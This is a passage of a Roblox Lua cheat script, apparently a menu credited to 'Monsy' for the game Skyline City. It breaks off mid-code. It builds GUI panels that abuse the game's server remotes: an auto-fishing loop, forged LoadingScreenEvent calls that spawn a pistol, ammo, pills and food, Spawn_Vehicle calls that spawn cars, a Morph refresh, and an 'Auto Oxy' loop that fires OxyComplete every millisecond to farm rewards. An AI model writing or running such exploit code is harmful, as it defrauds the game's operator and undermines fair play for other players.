rodLabel.TextXAlignment     = Enum.TextXAlignment.Left
rodLabel.Parent             = frame

local catchLabel = Instance.new("TextLabel")
catchLabel.Size               = UDim2.new(1, -20, 0, 22)
catchLabel.Position           = UDim2.new(0, 14, 0, 122)
catchLabel.BackgroundTransparency = 1
catchLabel.Text               = "Caught: 0"
catchLabel.TextSize           = 12
catchLabel.Font               = Enum.Font.RobotoMono
catchLabel.TextColor3         = BLACK
catchLabel.TextXAlignment     = Enum.TextXAlignment.Left
catchLabel.Parent             = frame

-- WHITE button, BLACK text
local btn = Instance.new("TextButton")
btn.Size             = UDim2.new(1, -20, 0, 40)
btn.Position         = UDim2.new(0, 10, 0, 158)
btn.BackgroundColor3 = WHITE
btn.BorderSizePixel  = 0
btn.Text             = "START"
btn.TextSize         = 14
btn.Font             = Enum.Font.RobotoMono
btn.TextColor3       = BLACK
btn.Parent           = frame
corner(btn, 7)

local btnStroke = Instance.new("UIStroke")
btnStroke.Color     = Color3.fromRGB(200, 200, 200)
btnStroke.Thickness = 1
btnStroke.Parent    = btn

local credit = Instance.new("TextLabel")
credit.Size               = UDim2.new(1, 0, 0, 16)
credit.Position           = UDim2.new(0, 0, 0, 196)
credit.BackgroundTransparency = 1
credit.Text               = "x01337 | // @ Monsy | Public Enemy"
credit.TextSize           = 10
credit.Font               = Enum.Font.RobotoMono
credit.TextColor3         = Color3.fromRGB(0, 0, 0)
credit.Parent             = frame

-- ─── Draggable ────────────────────────────────────────────
do
    local dragging, dragStart, startPos = false, nil, nil
    titleBar.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging  = true
            dragStart = i.Position
            startPos  = frame.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
            local d = i.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + d.X,
                startPos.Y.Scale, startPos.Y.Offset + d.Y
            )
        end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
end

-- ─── GUI Helpers ──────────────────────────────────────────
local function setStatus(txt) statusLabel.Text = "Status: " .. txt end
local function setPhase(txt)  phaseLabel.Text  = txt end
local function setRod(txt)    rodLabel.Text    = "Rod: " .. txt end

-- ─── Rod Watchdog ─────────────────────────────────────────
local function rodWatchdog()
    while autoFishing do
        task.wait(1)
        if not autoFishing then break end

        if not hasRod() and not rebuying and not catching then
            rebuying = true
            setRod("Missing! Buying...")
            setStatus("Buying rod...")
            setPhase("Auto-purchasing " .. ROD_NAME)

            local bought = buyRod()
            if bought then
                local equipped = equipRod()
                if equipped then
                    setRod("Equipped")
                    setStatus("Casting...")
                    setPhase("CastEvent firing...")
                    task.wait(0.3)
                    doCast()
                    setStatus("Waiting bite...")
                    setPhase("Auto Cast")
                else
                    setRod("Equip failed!")
                    setStatus("Could not equip rod")
                end
            else
                setRod("Buy failed!")
                setStatus("Purchase failed - retrying...")
            end

            rebuying = false
        end
    end
end

-- ─── MiniGame event (fish caught) ─────────────────────────
MiniGame.OnClientEvent:Connect(function()
    if not autoFishing or catching or rebuying then return end
    catching = true

    catchCount += 1
    catchLabel.Text = "Caught: " .. catchCount
    setStatus("Caught! (@" .. catchCount .. ")")
    setPhase("Waiting before recast...")
    task.wait(1.5)

    if not autoFishing then
        catching = false
        return
    end

    if not hasRod() then
        setStatus("No rod - watchdog handling...")
        catching = false
        return
    end

    equipRod()
    setStatus("Casting...")
    setPhase("CastEvent firing...")
    doCast()
    setStatus("Waiting bite...")
    setPhase("Auto Cast")

    catching = false
end)

-- ─── Main loop — F spam only ──────────────────────────────
local function fishLoop()
    setStatus("Checking rod...")
    setRod("Checking...")
    local ready = ensureRod()
    if not ready then
        setStatus("Could not get rod. Stopped.")
        setRod("Failed")
        autoFishing = false
        btn.Text = "START"
        return
    end
    setRod("Equipped")

    task.wait(0.3)

    setStatus("Casting...")
    setPhase("CastEvent firing...")
    doCast()
    setStatus("Waiting bite...")
    setPhase("Auto Cast")

    task.spawn(rodWatchdog)

    while autoFishing do
        pressF()
        task.wait(0.001)
    end

    setStatus("Idle")
    setPhase("")
    setRod("--")
end

-- ─── Button ───────────────────────────────────────────────
btn.MouseButton1Click:Connect(function()
    autoFishing = not autoFishing
    if autoFishing then
        btn.Text        = "STOP"
        catching        = false
        rebuying        = false
        catchCount      = 0
        catchLabel.Text = "Caught: 0"
        task.spawn(fishLoop)
    else
        btn.Text = "START"
        setStatus("Stopped")
        setPhase("")
    end
end)

btn.MouseEnter:Connect(function()
    btn.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
end)
btn.MouseLeave:Connect(function()
    btn.BackgroundColor3 = WHITE
end)
end)

addMainMenuButton("SKYLINE CITY REFRESH (MONSY)", function()
	local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local UserInputService = game:GetService("UserInputService")
local RS = game:GetService("ReplicatedStorage")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MonsyMorphGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 220, 0, 120)
MainFrame.Position = UDim2.new(0.5, -110, 0.5, -60)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(210, 210, 210)
UIStroke.Thickness = 1
UIStroke.Parent = MainFrame

local Shadow = Instance.new("Frame")
Shadow.Size = UDim2.new(1, 8, 1, 8)
Shadow.Position = UDim2.new(0, -4, 0, 4)
Shadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Shadow.BackgroundTransparency = 0.82
Shadow.BorderSizePixel = 0
Shadow.ZIndex = MainFrame.ZIndex - 1
Shadow.Parent = MainFrame

local ShadowCorner = Instance.new("UICorner")
ShadowCorner.CornerRadius = UDim.new(0, 10)
ShadowCorner.Parent = Shadow

local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.Position = UDim2.new(0, 0, 0, 0)
TitleBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBar.BorderSizePixel = 0
TitleBar.ZIndex = 2
TitleBar.Parent = MainFrame

local TitleBarCorner = Instance.new("UICorner")
TitleBarCorner.CornerRadius = UDim.new(0, 8)
TitleBarCorner.Parent = TitleBar

local TitleBarFix = Instance.new("Frame")
TitleBarFix.Size = UDim2.new(1, 0, 0, 10)
TitleBarFix.Position = UDim2.new(0, 0, 1, -10)
TitleBarFix.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBarFix.BorderSizePixel = 0
TitleBarFix.ZIndex = 2
TitleBarFix.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.Position = UDim2.new(0, 0, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "// @ Monsy"
TitleLabel.TextColor3 = Color3.fromRGB(20, 20, 20)
TitleLabel.TextSize = 17
TitleLabel.Font = Enum.Font.RobotoMono
TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
TitleLabel.ZIndex = 3
TitleLabel.Parent = TitleBar

local RefreshBtn = Instance.new("TextButton")
RefreshBtn.Size = UDim2.new(0, 160, 0, 36)
RefreshBtn.Position = UDim2.new(0.5, -80, 0, 52)
RefreshBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RefreshBtn.Text = "Refresh"
RefreshBtn.TextColor3 = Color3.fromRGB(20, 20, 20)
RefreshBtn.TextSize = 20
RefreshBtn.Font = Enum.Font.RobotoMono
RefreshBtn.BorderSizePixel = 0
RefreshBtn.ZIndex = 2
RefreshBtn.Parent = MainFrame

local RefreshCorner = Instance.new("UICorner")
RefreshCorner.CornerRadius = UDim.new(0, 6)
RefreshCorner.Parent = RefreshBtn

local RefreshStroke = Instance.new("UIStroke")
RefreshStroke.Color = Color3.fromRGB(20, 20, 20)
RefreshStroke.Thickness = 0
RefreshStroke.Parent = RefreshBtn

RefreshBtn.MouseButton1Click:Connect(function()
    RefreshBtn.Text = "..."
    pcall(function()
        local args = {
            [1] = "Male",
            [2] = "Monsy",
            [3] = "West",
        }
        RS:WaitForChild("SkylineRP", 9e9):WaitForChild("Morph", 9e9):FireServer(unpack(args))
    end)
    task.wait(0.001)
    RefreshBtn.Text = "Refresh"
end)

local dragging = false
local dragInput, mousePos, framePos

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        mousePos = input.Position
        framePos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - mousePos
        MainFrame.Position = UDim2.new(
            framePos.X.Scale,
            framePos.X.Offset + delta.X,
            framePos.Y.Scale,
            framePos.Y.Offset + delta.Y
        )
    end
end)
end)

addMainMenuButton("SKYLINE CITY SPAWN GUN (MONSY)", function()
	local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local UserInputService = game:GetService("UserInputService")
local RS = game:GetService("ReplicatedStorage")

local BUTTONS = {
    {
        name = "Normal Pistol",
        args = {"Normal Pistol", 800, "VenomMaxpein"}
    },
    {
        name = "StressTabs",
        args = {"StressTabs", 50, "VenomMaxpein"}
    },
    {
        name = "Red Pill",
        args = {"Red Pill", 450, "VenomMaxpein"}
    },
    {
        name = "AmmoBox",
        args = {"AmmoBox", 100, "VenomMaxpein"}
    },
}

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MonsyItemsGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 220, 0, 60 + #BUTTONS * 44)
MainFrame.Position = UDim2.new(0.5, -110, 0.5, -(60 + #BUTTONS * 44) / 2)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(210, 210, 210)
UIStroke.Thickness = 0
UIStroke.Parent = MainFrame

local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.Position = UDim2.new(0, 0, 0, 0)
TitleBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBar.BorderSizePixel = 0
TitleBar.ZIndex = 2
TitleBar.Parent = MainFrame

local TitleBarCorner = Instance.new("UICorner")
TitleBarCorner.CornerRadius = UDim.new(0, 8)
TitleBarCorner.Parent = TitleBar

local TitleBarFix = Instance.new("Frame")
TitleBarFix.Size = UDim2.new(1, 0, 0, 10)
TitleBarFix.Position = UDim2.new(0, 0, 1, -10)
TitleBarFix.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBarFix.BorderSizePixel = 0
TitleBarFix.ZIndex = 2
TitleBarFix.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.Position = UDim2.new(0, 0, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "// @ Monsy"
TitleLabel.TextColor3 = Color3.fromRGB(20, 20, 20)
TitleLabel.TextSize = 17
TitleLabel.Font = Enum.Font.RobotoMono
TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
TitleLabel.ZIndex = 3
TitleLabel.Parent = TitleBar

for i, btn in ipairs(BUTTONS) do
    local yPos = 48 + (i - 1) * 44

    local Btn = Instance.new("TextButton")
    Btn.Size = UDim2.new(0, 180, 0, 34)
    Btn.Position = UDim2.new(0.5, -90, 0, yPos)
    Btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Btn.Text = btn.name
    Btn.TextColor3 = Color3.fromRGB(20, 20, 20)
    Btn.TextSize = 15
    Btn.Font = Enum.Font.RobotoMono
    Btn.BorderSizePixel = 0
    Btn.ZIndex = 2
    Btn.Parent = MainFrame

    local BtnCorner = Instance.new("UICorner")
    BtnCorner.CornerRadius = UDim.new(0, 6)
    BtnCorner.Parent = Btn

    local BtnStroke = Instance.new("UIStroke")
    BtnStroke.Color = Color3.fromRGB(20, 20, 20)
    BtnStroke.Thickness = 0
    BtnStroke.Parent = Btn

    local capturedBtn = btn
    local capturedBtnRef = Btn

    Btn.MouseButton1Click:Connect(function()
        capturedBtnRef.Text = "..."
        pcall(function()
            RS:WaitForChild("SkylineRP", 9e9):WaitForChild("LoadingScreenEvent", 9e9):FireServer(unpack(capturedBtn.args))
        end)
        task.wait(0.001)
        capturedBtnRef.Text = capturedBtn.name
    end)
end

local dragging = false
local dragInput, mousePos, framePos

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        mousePos = input.Position
        framePos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - mousePos
        MainFrame.Position = UDim2.new(
            framePos.X.Scale,
            framePos.X.Offset + delta.X,
            framePos.Y.Scale,
            framePos.Y.Offset + delta.Y
        )
    end
end)
end)

addMainMenuButton("SKYLINE CITY SPAWN CAR (MONSY)", function()
	local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local UserInputService = game:GetService("UserInputService")
local RS = game:GetService("ReplicatedStorage")

local BUTTONS = {
    {name = "2021 Honda Civic"},
    {name = "2021 Honda City"},
    {name = "2021 Mitsubishi Shogun Sport"},
    {name = "2017 Mitsubishi Xpander Ultimate"},
}

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MonsySpawnCarGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 260, 0, 60 + #BUTTONS * 44)
MainFrame.Position = UDim2.new(0.5, -130, 0.5, -(60 + #BUTTONS * 44) / 2)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(210, 210, 210)
UIStroke.Thickness = 1
UIStroke.Parent = MainFrame

local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.Position = UDim2.new(0, 0, 0, 0)
TitleBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBar.BorderSizePixel = 0
TitleBar.ZIndex = 2
TitleBar.Parent = MainFrame

local TitleBarCorner = Instance.new("UICorner")
TitleBarCorner.CornerRadius = UDim.new(0, 8)
TitleBarCorner.Parent = TitleBar

local TitleBarFix = Instance.new("Frame")
TitleBarFix.Size = UDim2.new(1, 0, 0, 10)
TitleBarFix.Position = UDim2.new(0, 0, 1, -10)
TitleBarFix.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBarFix.BorderSizePixel = 0
TitleBarFix.ZIndex = 2
TitleBarFix.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.Position = UDim2.new(0, 0, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "// @ Monsy"
TitleLabel.TextColor3 = Color3.fromRGB(20, 20, 20)
TitleLabel.TextSize = 17
TitleLabel.Font = Enum.Font.RobotoMono
TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
TitleLabel.ZIndex = 3
TitleLabel.Parent = TitleBar

for i, btn in ipairs(BUTTONS) do
    local yPos = 48 + (i - 1) * 44

    local Btn = Instance.new("TextButton")
    Btn.Size = UDim2.new(0, 220, 0, 34)
    Btn.Position = UDim2.new(0.5, -110, 0, yPos)
    Btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Btn.Text = btn.name
    Btn.TextColor3 = Color3.fromRGB(20, 20, 20)
    Btn.TextSize = 15
    Btn.Font = Enum.Font.RobotoMono
    Btn.BorderSizePixel = 0
    Btn.ZIndex = 2
    Btn.Parent = MainFrame

    local BtnCorner = Instance.new("UICorner")
    BtnCorner.CornerRadius = UDim.new(0, 6)
    BtnCorner.Parent = Btn

    local BtnStroke = Instance.new("UIStroke")
    BtnStroke.Color = Color3.fromRGB(20, 20, 20)
    BtnStroke.Thickness = 0
    BtnStroke.Parent = Btn

    local capturedBtn = btn
    local capturedBtnRef = Btn

    Btn.MouseButton1Click:Connect(function()
        capturedBtnRef.Text = "..."
        pcall(function()
            RS:WaitForChild("VehicleDealerSystem", 9e9)
               :WaitForChild("Spawner", 9e9)
               :WaitForChild("Functions", 9e9)
               :WaitForChild("Spawn_Vehicle", 9e9)
               :InvokeServer(capturedBtn.name)
        end)
        task.wait(0.001)
        capturedBtnRef.Text = capturedBtn.name
    end)
end

local dragging = false
local dragInput, mousePos, framePos

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        mousePos = input.Position
        framePos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - mousePos
        MainFrame.Position = UDim2.new(
            framePos.X.Scale,
            framePos.X.Offset + delta.X,
            framePos.Y.Scale,
            framePos.Y.Offset + delta.Y
        )
    end
end)
end)

addMainMenuButton("SKYLINE CITY SPAWN FOOD (MONSY)", function()
	local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local UserInputService = game:GetService("UserInputService")
local RS = game:GetService("ReplicatedStorage")

local BUTTONS = {
    {name = "Orange Juice", args = {"Orange Juice", 10, "VenomMaxpein"}},
    {name = "Burger", args = {"Burger", 15, "VenomMaxpein"}},
}

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MonsyFoodGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 220, 0, 60 + #BUTTONS * 44)
MainFrame.Position = UDim2.new(0.5, -110, 0.5, -(60 + #BUTTONS * 44) / 2)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(210, 210, 210)
UIStroke.Thickness = 1
UIStroke.Parent = MainFrame

local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.Position = UDim2.new(0, 0, 0, 0)
TitleBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBar.BorderSizePixel = 0
TitleBar.ZIndex = 2
TitleBar.Parent = MainFrame

local TitleBarCorner = Instance.new("UICorner")
TitleBarCorner.CornerRadius = UDim.new(0, 8)
TitleBarCorner.Parent = TitleBar

local TitleBarFix = Instance.new("Frame")
TitleBarFix.Size = UDim2.new(1, 0, 0, 10)
TitleBarFix.Position = UDim2.new(0, 0, 1, -10)
TitleBarFix.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBarFix.BorderSizePixel = 0
TitleBarFix.ZIndex = 2
TitleBarFix.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.Position = UDim2.new(0, 0, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "// @ Monsy"
TitleLabel.TextColor3 = Color3.fromRGB(20, 20, 20)
TitleLabel.TextSize = 17
TitleLabel.Font = Enum.Font.RobotoMono
TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
TitleLabel.ZIndex = 3
TitleLabel.Parent = TitleBar

for i, btn in ipairs(BUTTONS) do
    local yPos = 48 + (i - 1) * 44

    local Btn = Instance.new("TextButton")
    Btn.Size = UDim2.new(0, 180, 0, 34)
    Btn.Position = UDim2.new(0.5, -90, 0, yPos)
    Btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Btn.Text = btn.name
    Btn.TextColor3 = Color3.fromRGB(20, 20, 20)
    Btn.TextSize = 15
    Btn.Font = Enum.Font.RobotoMono
    Btn.BorderSizePixel = 0
    Btn.ZIndex = 2
    Btn.Parent = MainFrame

    local BtnCorner = Instance.new("UICorner")
    BtnCorner.CornerRadius = UDim.new(0, 6)
    BtnCorner.Parent = Btn

    local BtnStroke = Instance.new("UIStroke")
    BtnStroke.Color = Color3.fromRGB(20, 20, 20)
    BtnStroke.Thickness = 0
    BtnStroke.Parent = Btn

    local capturedBtn = btn
    local capturedBtnRef = Btn

    Btn.MouseButton1Click:Connect(function()
        capturedBtnRef.Text = "..."
        pcall(function()
            RS:WaitForChild("SkylineRP", 9e9):WaitForChild("LoadingScreenEvent", 9e9):FireServer(unpack(capturedBtn.args))
        end)
        task.wait(0.001)
        capturedBtnRef.Text = capturedBtn.name
    end)
end

local dragging = false
local dragInput, mousePos, framePos

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        mousePos = input.Position
        framePos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - mousePos
        MainFrame.Position = UDim2.new(
            framePos.X.Scale,
            framePos.X.Offset + delta.X,
            framePos.Y.Scale,
            framePos.Y.Offset + delta.Y
        )
    end
end)
end)

addMainMenuButton("SKYLINE CITY AUTO OXY (MONSY)", function()
	local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local UserInputService = game:GetService("UserInputService")
local RS = game:GetService("ReplicatedStorage")

local state = false
local thread = nil

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MonsyOxyGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 220, 0, 120)
MainFrame.Position = UDim2.new(0.5, -110, 0.5, -60)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(210, 210, 210)
UIStroke.Thickness = 1
UIStroke.Parent = MainFrame

local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.Position = UDim2.new(0, 0, 0, 0)
TitleBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBar.BorderSizePixel = 0
TitleBar.ZIndex = 2
TitleBar.Parent = MainFrame

local TitleBarCorner = Instance.new("UICorner")
TitleBarCorner.CornerRadius = UDim.new(0, 8)
TitleBarCorner.Parent = TitleBar

local TitleBarFix = Instance.new("Frame")
TitleBarFix.Size = UDim2.new(1, 0, 0, 10)
TitleBarFix.Position = UDim2.new(0, 0, 1, -10)
TitleBarFix.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBarFix.BorderSizePixel = 0
TitleBarFix.ZIndex = 2
TitleBarFix.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.Position = UDim2.new(0, 0, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "// @ Monsy"
TitleLabel.TextColor3 = Color3.fromRGB(20, 20, 20)
TitleLabel.TextSize = 17
TitleLabel.Font = Enum.Font.RobotoMono
TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
TitleLabel.ZIndex = 3
TitleLabel.Parent = TitleBar

local OxyBtn = Instance.new("TextButton")
OxyBtn.Size = UDim2.new(0, 180, 0, 36)
OxyBtn.Position = UDim2.new(0.5, -90, 0, 52)
OxyBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OxyBtn.Text = "OXY | OFF"
OxyBtn.TextColor3 = Color3.fromRGB(20, 20, 20)
OxyBtn.TextSize = 17
OxyBtn.Font = Enum.Font.RobotoMono
OxyBtn.BorderSizePixel = 0
OxyBtn.ZIndex = 2
OxyBtn.Parent = MainFrame

local OxyBtnCorner = Instance.new("UICorner")
OxyBtnCorner.CornerRadius = UDim.new(0, 6)
OxyBtnCorner.Parent = OxyBtn

local OxyBtnStroke = Instance.new("UIStroke")
OxyBtnStroke.Color = Color3.fromRGB(20, 20, 20)
OxyBtnStroke.Thickness = 0
OxyBtnStroke.Parent = OxyBtn

OxyBtn.MouseButton1Click:Connect(function()
    state = not state

    if state then
        OxyBtn.Text = "OXY | ON"
        thread = task.spawn(function()
            while state do
                pcall(function()
                    RS:WaitForChild("SkylineRP", 9e9):WaitForChild("OxyComplete", 9e9):FireServer()
                end)
                task.wait(0.001)
            end
        end)
    else
        if thread then
            task.cancel(thread)
            thread = nil
        end
        OxyBtn.Text = "OXY | OFF"
    end
end)

local dragging = false
local dragInput, mousePos, framePos

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        mousePos = input.Position
        framePos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - mousePos
        MainFrame.Position = UDim2.new(
            framePos.X.Scale,
            framePos.X.Offset + delta.X,
            framePos.Y.Scale,
            framePos.Y.Offset + delta.Y
        )
    end
end)
end)

addMainMenuButton("SKYLINE CITY TELEPORT STORAGE (MONSY)", function()
	local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local UserInputService = game:GetService("UserInputService")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MonsyStorageGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 220, 0, 120)
MainFrame.Position = UDim2.new(0.5, -110, 0.5, -60)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(210, 210, 210)
UIStroke.Thickness = 1
UIStroke.Parent = MainFrame

local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.Position = UDim2.new(0, 0, 0, 0)
TitleBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
